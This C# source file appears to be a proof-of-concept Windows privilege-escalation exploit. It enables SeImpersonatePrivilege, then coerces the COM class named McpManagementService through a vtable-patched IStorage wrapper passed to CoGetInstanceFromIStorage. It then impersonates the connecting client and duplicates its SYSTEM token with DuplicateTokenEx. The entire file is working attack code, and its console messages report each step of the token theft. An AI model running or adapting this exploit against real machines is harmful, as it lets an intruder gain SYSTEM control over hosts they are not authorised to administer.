using System;
using System.Data;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;

namespace McpManagSvc
{
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct MULTI_QI
    {
        public IntPtr pIID;
        public IntPtr pItf;
        public int hr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class FILETIME
    {
        public int dwLowDateTime;

        public int dwHighDateTime;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class STATSTG
    {
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwcsName;

        public int type;

        [MarshalAs(UnmanagedType.I8)]
        public long cbSize;

        [MarshalAs(UnmanagedType.I8)]
        public long mtime;

        [MarshalAs(UnmanagedType.I8)]
        public long ctime;

        [MarshalAs(UnmanagedType.I8)]
        public long atime;

        [MarshalAs(UnmanagedType.I4)]
        public int grfMode;

        [MarshalAs(UnmanagedType.I4)]
        public int grfLocksSupported;

        public int clsid_data1;

        [MarshalAs(UnmanagedType.I2)]
        public short clsid_data2;

        [MarshalAs(UnmanagedType.I2)]
        public short clsid_data3;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b0;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b1;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b2;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b3;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b4;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b5;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b6;

        [MarshalAs(UnmanagedType.U1)]
        public byte clsid_b7;

        [MarshalAs(UnmanagedType.I4)]
        public int grfStateBits;

        [MarshalAs(UnmanagedType.I4)]
        public int reserved;
    }

    public enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }
    
    public enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    #region interop
    static class NativeMethods
    {
        [DllImport("ole32.dll", PreserveSig = false)]
        public static extern ILockBytes CreateILockBytesOnHGlobal(
            IntPtr hGlobal,
            bool fDeleteOnRelease);
        
        [DllImport("ole32.dll", PreserveSig = false)]
        public static extern IStorage StgCreateDocfileOnILockBytes(
            ILockBytes iLockBytes, 
            int grfMode, 
            int reserved);

        [DllImport("ole32.dll")]
        public static extern int CoGetInstanceFromIStorage(
            IntPtr pServerInfo,
            ref Guid pclsid,
            IntPtr pUnkOuter,
            int dwClsCtx,
            IntPtr pstg,
            uint cmq,
            [In, Out] MULTI_QI[] rgmqResults);

        [DllImport("ole32.dll")]
        public static extern int CoImpersonateClient();
        
        [DllImport("ole32.dll")]
        public static extern int CoRevertToSelf();
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(
            IntPtr handle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            int Bufferlength,
            IntPtr PreviousState,
            IntPtr ReturnLength);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);
        
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);
    }
    
    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("0000000A-0000-0000-C000-000000000046")]
    public interface ILockBytes
    {
        void ReadAt([In][MarshalAs(UnmanagedType.U8)] long ulOffset, [Out] IntPtr pv, [In][MarshalAs(UnmanagedType.U4)] int cb, [Out][MarshalAs(UnmanagedType.LPArray)] int[] pcbRead);

        void WriteAt([In][MarshalAs(UnmanagedType.U8)] long ulOffset, IntPtr pv, [In][MarshalAs(UnmanagedType.U4)] int cb, [Out][MarshalAs(UnmanagedType.LPArray)] int[] pcbWritten);

        void Flush();

        void SetSize([In][MarshalAs(UnmanagedType.U8)] long cb);

        void LockRegion([In][MarshalAs(UnmanagedType.U8)] long libOffset, [In][MarshalAs(UnmanagedType.U8)] long cb, [In][MarshalAs(UnmanagedType.U4)] int dwLockType);

        void UnlockRegion([In][MarshalAs(UnmanagedType.U8)] long libOffset, [In][MarshalAs(UnmanagedType.U8)] long cb, [In][MarshalAs(UnmanagedType.U4)] int dwLockType);

        void Stat([Out] STATSTG pstatstg, [In][MarshalAs(UnmanagedType.U4)] int grfStatFlag);
    }

    [ComImport]
    [Guid("0000000B-0000-0000-C000-000000000046")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IStorage
    {
        [return: MarshalAs(UnmanagedType.Interface)]
        IStream CreateStream([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In][MarshalAs(UnmanagedType.U4)] int grfMode, [In][MarshalAs(UnmanagedType.U4)] int reserved1, [In][MarshalAs(UnmanagedType.U4)] int reserved2);

        [return: MarshalAs(UnmanagedType.Interface)]
        IStream OpenStream([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr reserved1, [In][MarshalAs(UnmanagedType.U4)] int grfMode, [In][MarshalAs(UnmanagedType.U4)] int reserved2);

        [return: MarshalAs(UnmanagedType.Interface)]
        IStorage CreateStorage([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In][MarshalAs(UnmanagedType.U4)] int grfMode, [In][MarshalAs(UnmanagedType.U4)] int reserved1, [In][MarshalAs(UnmanagedType.U4)] int reserved2);

        [return: MarshalAs(UnmanagedType.Interface)]
        IStorage OpenStorage([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr pstgPriority, [In][MarshalAs(UnmanagedType.U4)] int grfMode, IntPtr snbExclude, [In][MarshalAs(UnmanagedType.U4)] int reserved);

        void CopyTo(int ciidExclude, [In][MarshalAs(UnmanagedType.LPArray)] Guid[] pIIDExclude, IntPtr snbExclude, [In][MarshalAs(UnmanagedType.Interface)] IStorage stgDest);

        void MoveElementTo([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In][MarshalAs(UnmanagedType.Interface)] IStorage stgDest, [In][MarshalAs(UnmanagedType.BStr)] string pwcsNewName, [In][MarshalAs(UnmanagedType.U4)] int grfFlags);

        void Commit(int grfCommitFlags);

        void Revert();

        void EnumElements([In][MarshalAs(UnmanagedType.U4)] int reserved1, IntPtr reserved2, [In][MarshalAs(UnmanagedType.U4)] int reserved3, [MarshalAs(UnmanagedType.Interface)] out object ppVal);

        void DestroyElement([In][MarshalAs(UnmanagedType.BStr)] string pwcsName);

        void RenameElement([In][MarshalAs(UnmanagedType.BStr)] string pwcsOldName, [In][MarshalAs(UnmanagedType.BStr)] string pwcsNewName);

        void SetElementTimes([In][MarshalAs(UnmanagedType.BStr)] string pwcsName, [In] FILETIME pctime, [In] FILETIME patime, [In] FILETIME pmtime);

        void SetClass([In] ref Guid clsid);

        void SetStateBits(int grfStateBits, int grfMask);

        void Stat([Out] STATSTG pStatStg, int grfStatFlag);
    }
    #endregion

    class ManagedIStorageWrapper : IStorage
    {
        delegate int stat(IntPtr stg, STATSTG s, int i);
        private IStorage _storage;
        private stat _old = null;
        public IntPtr sysTkn = IntPtr.Zero;

        public ManagedIStorageWrapper(IStorage storage)
        {
            _storage = storage;
        }

        public void DelegateStorage()
        {
            NativeMethods.CoImpersonateClient();
            var identity = WindowsIdentity.GetCurrent();
            IntPtr tkn = identity.Token;

            var dwTokenRights = 395U;
            var securityAttr = new SECURITY_ATTRIBUTES();

            if (!NativeMethods.DuplicateTokenEx(tkn, 
                                dwTokenRights, 
                                ref securityAttr, 
                                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                TOKEN_TYPE.TokenPrimary, 
                                out sysTkn))
            {
                var errorCode = Marshal.GetLastWin32Error();
                NativeMethods.CloseHandle(tkn);
                throw new Exception("DuplicateTokenEx failed with the following error: " + errorCode);
            }
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStream CreateStream([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved1, [In, MarshalAs(UnmanagedType.U4)] int reserved2)
        {
            DelegateStorage();
            return _storage.CreateStream(pwcsName, grfMode, reserved1, reserved2);
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStream OpenStream([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr reserved1, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved2)
        {
            DelegateStorage();
            return _storage.OpenStream(pwcsName, reserved1, grfMode, reserved2);
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStorage CreateStorage([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.U4)] int grfMode, [In, MarshalAs(UnmanagedType.U4)] int reserved1, [In, MarshalAs(UnmanagedType.U4)] int reserved2)
        {
            DelegateStorage();
            return _storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2);
        }

        [return: MarshalAs(UnmanagedType.Interface)]
        public IStorage OpenStorage([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, IntPtr pstgPriority, [In, MarshalAs(UnmanagedType.U4)] int grfMode, IntPtr snbExclude, [In, MarshalAs(UnmanagedType.U4)] int reserved)
        {
            DelegateStorage();
            return _storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved);
        }

        public void CopyTo(int ciidExclude, [In, MarshalAs(UnmanagedType.LPArray)] Guid[] pIIDExclude, IntPtr snbExclude, [In, MarshalAs(UnmanagedType.Interface)] IStorage stgDest)
        {
            DelegateStorage();
            _storage.CopyTo(ciidExclude, pIIDExclude, snbExclude, stgDest);
        }

        public void MoveElementTo([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In, MarshalAs(UnmanagedType.Interface)] IStorage stgDest, [In, MarshalAs(UnmanagedType.BStr)] string pwcsNewName, [In, MarshalAs(UnmanagedType.U4)] int grfFlags)
        {
            DelegateStorage();
            _storage.MoveElementTo(pwcsName, stgDest, pwcsNewName, grfFlags);
        }

        public void Commit(int grfCommitFlags)
        {
            DelegateStorage();
            _storage.Commit(grfCommitFlags);
        }

        public void Revert()
        {
            DelegateStorage();
            _storage.Revert();
        }

        public void EnumElements([In, MarshalAs(UnmanagedType.U4)] int reserved1, IntPtr reserved2, [In, MarshalAs(UnmanagedType.U4)] int reserved3, [MarshalAs(UnmanagedType.Interface)] out object ppVal)
        {
            DelegateStorage();
            _storage.EnumElements(reserved1, reserved2, reserved3, out ppVal);
        }

        public void DestroyElement([In, MarshalAs(UnmanagedType.BStr)] string pwcsName)
        {
            DelegateStorage();
            _storage.DestroyElement(pwcsName);
        }

        public void RenameElement([In, MarshalAs(UnmanagedType.BStr)] string pwcsOldName, [In, MarshalAs(UnmanagedType.BStr)] string pwcsNewName)
        {
            DelegateStorage();
            _storage.RenameElement(pwcsOldName, pwcsNewName);
        }

        public void SetElementTimes([In, MarshalAs(UnmanagedType.BStr)] string pwcsName, [In] FILETIME pctime, [In] FILETIME patime, [In] FILETIME pmtime)
        {
            DelegateStorage();
            _storage.SetElementTimes(pwcsName, pctime, patime, pmtime);
        }

        public void SetClass([In] ref Guid clsid)
        {
            DelegateStorage();
            _storage.SetClass(ref clsid);
        }

        public void SetStateBits(int grfStateBits, int grfMask)
        {
            DelegateStorage();
            _storage.SetStateBits(grfStateBits, grfMask);
        }

        public void Stat([Out] STATSTG pStatStg, int grfStatFlag)
        {
            DelegateStorage();
            if (_old != null)
            {
                _old(Marshal.GetComInterfaceForObject(_storage, typeof(IStorage)), pStatStg, grfStatFlag);
            }
            else
            {
                _storage.Stat(pStatStg, grfStatFlag);
            }
            pStatStg.pwcsName = "dummy.stg";
        }
    }
    class Program
    {
        public static unsafe void Main(string[] args)
        {
            try
            {
                LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
                using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("[+] Current user: '" + wi.Name + "'");
                    NativeMethods.LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                    tp.PrivilegeCount = 1;
                    tp.Privileges = l;
                    l[0].Attributes = 2;
                    if (!NativeMethods.AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                    {
                        Console.WriteLine("[!] SeImpersonatePrivilege not held.");
                        return;
                    }
                }
                Console.WriteLine("[+] SeImpersonatePrivilege enabled");

                var CLSID_McpManagementService = new Guid("{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}");
                var lb = NativeMethods.CreateILockBytesOnHGlobal(IntPtr.Zero, true);
                var stg = NativeMethods.StgCreateDocfileOnILockBytes(lb, 0x1012, 0);
                var wrapper = new ManagedIStorageWrapper(stg);
                MULTI_QI[] qis = new MULTI_QI[1];
                qis[0] = new MULTI_QI();
                Console.WriteLine("[+] Impersonating...");

                fixed( byte* pIID_IUnk = new Guid("{00000000-0000-0000-C000-000000000046}").ToByteArray())
				{
					qis[0].pIID = (IntPtr)pIID_IUnk;
					qis[0].pItf = IntPtr.Zero;
					qis[0].hr = 0;
					var pobj = Marshal.GetComInterfaceForObject(wrapper, typeof(IStorage));
					IntPtr vtbl = *(IntPtr*)pobj;
					*(IntPtr*)(vtbl + 8 * 0x2) = Marshal.GetFunctionPointerForDelegate(new Action(wrapper.DelegateStorage));
					var ret = NativeMethods.CoGetInstanceFromIStorage(IntPtr.Zero, ref CLSID_McpManagementService, IntPtr.Zero, 4, pobj, 1, qis);
				}

                Console.WriteLine("[+] Duplicated SYSTEM Token: '" + wrapper.sysTkn.ToInt32().ToString() + "'");

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Exception: " + ex);
            }
        }
    }
}